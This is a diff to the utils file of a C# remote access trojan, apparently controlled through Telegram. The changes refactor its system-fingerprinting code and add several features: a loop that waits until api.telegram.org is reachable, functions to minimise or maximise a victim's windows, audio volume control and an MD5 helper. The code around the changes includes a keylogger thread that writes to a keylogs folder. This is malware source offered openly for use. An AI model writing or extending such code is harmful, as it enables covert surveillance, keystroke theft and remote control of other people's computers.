@@ -1,5 +1,4 @@
-﻿using Microsoft.Win32;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
@@ -7,16 +6,16 @@ using System.Linq;
 using System.Management;
 using System.Net;
 using System.Net.NetworkInformation;
-using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
+using Microsoft.Win32;
 
 namespace TelegramRAT
 {
-    internal class utils
+    internal static class utils
     {
         public static Thread keyloggerThread = new Thread(startKeylogger);
         public static string loggerPath = Path.GetDirectoryName(config.InstallPath) + "\\keylogs";
@@ -67,6 +66,12 @@ namespace TelegramRAT
         [DllImport("iphlpapi.dll", ExactSpelling = true)]
         public static extern int SendARP(int destIp, int srcIP, byte[] macAddr, ref uint physicalAddrLen);
 
+        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
+        private static extern IntPtr SendMessageW(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);
+
+        [DllImport("user32.dll", EntryPoint = "FindWindow", SetLastError = true)]
+        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
+
 
 
         // Is admin
@@ -106,16 +111,13 @@ namespace TelegramRAT
             try
             {
                 ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor");
-
                 foreach (ManagementObject mObject in mSearcher.Get())
                 {
                     return mObject["Name"].ToString();
                 }
-
                 return "Unknown";
             }
             catch { return "Unknown"; }
-
         }
 
         // Get GPU name
@@ -124,12 +126,10 @@ namespace TelegramRAT
             try
             {
                 ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController");
-
                 foreach (ManagementObject mObject in mSearcher.Get())
                 {
                     return mObject["Name"].ToString();
                 }
-
                 return "Unknown";
             }
             catch { return "Unknown"; }
@@ -141,8 +141,7 @@ namespace TelegramRAT
             try
             {
                 int RamAmount = 0;
-                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem")
-                )
+                using (ManagementObjectSearcher MOS = new ManagementObjectSearcher("Select * From Win32_ComputerSystem"))
                 {
                     foreach (ManagementObject MO in MOS.Get())
                     {
@@ -151,7 +150,6 @@ namespace TelegramRAT
                         break;
                     }
                 }
-
                 return RamAmount;
             }
             catch
@@ -165,13 +163,12 @@ namespace TelegramRAT
         {
             try
             {
-                ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor");
-
-                foreach (ManagementObject mObject in mSearcher.Get())
-                {
-                    return mObject["ProcessorId"].ToString();
+                using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor")){
+                    foreach (ManagementObject mObject in mSearcher.Get())
+                    {
+                        return mObject["ProcessorId"].ToString();
+                    }
                 }
-
                 return "Unknown";
             }
             catch { return "Unknown"; }
@@ -180,22 +177,20 @@ namespace TelegramRAT
         // Get system version
         private static string GetWindowsVersionName()
         {
-            ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem");
-            string sData = string.Empty;
-            foreach (ManagementObject tObj in mSearcher.Get())
-            {
-                sData = Convert.ToString(tObj["Name"]);
+            using (ManagementObjectSearcher mSearcher = new ManagementObjectSearcher(@"root\CIMV2", " SELECT * FROM win32_operatingsystem")){
+                string sData = string.Empty;
+                foreach (ManagementObject tObj in mSearcher.Get())
+                {
+                    sData = Convert.ToString(tObj["Name"]);
+                }
+                try {
+                    sData = sData.Split(new char[] { '|' })[0];
+                    int iLen = sData.Split(new char[] { ' ' })[0].Length;
+                    sData = sData.Substring(iLen).TrimStart().TrimEnd();
+                }
+                catch { sData = "Unknown System"; }
+                return sData;
             }
-
-            try
-            {
-                sData = sData.Split(new char[] { '|' })[0];
-                int iLen = sData.Split(new char[] { ' ' })[0].Length;
-                sData = sData.Substring(iLen).TrimStart().TrimEnd();
-            }
-            catch { sData = "Unknown System"; }
-
-            return sData;
         }
 
         // Get bit
@@ -252,24 +247,43 @@ namespace TelegramRAT
         // Is connected to internet
         public static void isConnectedToInternet()
         {
+            // Check if connected to internet
             while(true)
             {
-                Ping ping;
+                Ping ping = new Ping();
                 PingReply reply;
                 try
                 {
-                    ping = new Ping();
                     reply = ping.Send("google.com", 600);
                 } catch { continue; }
-                
-
+                // Status
                 if (reply.Status == IPStatus.Success)
                 {
-                    Console.WriteLine("Connected to internet");
+                    Console.WriteLine("[+] Connected to internet");
+                    // Check if can connect to api.telegram.org
+                    while (true)
+                    {
+                        try
+                        {
+                            reply = ping.Send("api.telegram.org", 600);
+                        }
+                        catch { continue; }
+                        // Status
+                        if (reply.Status == IPStatus.Success)
+                        {
+                            Console.WriteLine("[+] Connected to api.telegram.org");
+                            break;
+                        }
+                        else
+                        {
+                            Console.WriteLine("[!] Retrying connect to api.telegram.org");
+                            continue;
+                        }
+                    }
                     break;
                 }
                 else {
-                    Console.WriteLine("Retrying connect to internet...");
+                    Console.WriteLine("[!] Retrying connect to internet...");
                     continue;
                 }
             }
@@ -467,6 +481,34 @@ namespace TelegramRAT
             catch (Exception)
             {
                 return "Unknown";
+            }
+        }
+
+        // Max win
+        public static void MinimizeAllWindows()
+        {
+            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
+            SendMessageW(lHwnd, 0x111, (IntPtr)419, IntPtr.Zero);
+            
+        }
+
+        public static void MaximizeAllWindows()
+        {
+            IntPtr lHwnd = FindWindow("Shell_TrayWnd", null);
+            SendMessageW(lHwnd, 0x111, (IntPtr)416, IntPtr.Zero);
+        }
+
+        // MD5
+        public static string MD5(this string s)
+        {
+            using (var provider = System.Security.Cryptography.MD5.Create())
+            {
+                StringBuilder builder = new StringBuilder();
+
+                foreach (byte b in provider.ComputeHash(Encoding.UTF8.GetBytes(s)))
+                    builder.Append(b.ToString("x2").ToLower());
+
+                return builder.ToString();
             }
         }
 
@@ -784,9 +826,23 @@ namespace TelegramRAT
                 DisplayFixedOutput = 0x20000000
             }
         }
-    
 
 
+        // Set audio volume
+        public static void AudioVolumeSet(int volume)
+        {
+            // Set volume
+            AudioSwitcher.AudioApi.CoreAudio.CoreAudioDevice defaultPlaybackDevice = new AudioSwitcher.AudioApi.CoreAudio.CoreAudioController().DefaultPlaybackDevice;
+            defaultPlaybackDevice.Volume = volume;
+        }
+
+        // Get audio volume
+        public static double AudioVolumeGet()
+        {
+            // Get volume
+            AudioSwitcher.AudioApi.CoreAudio.CoreAudioDevice defaultPlaybackDevice = new AudioSwitcher.AudioApi.CoreAudio.CoreAudioController().DefaultPlaybackDevice;
+            return defaultPlaybackDevice.Volume;
+        }
 
 
     }
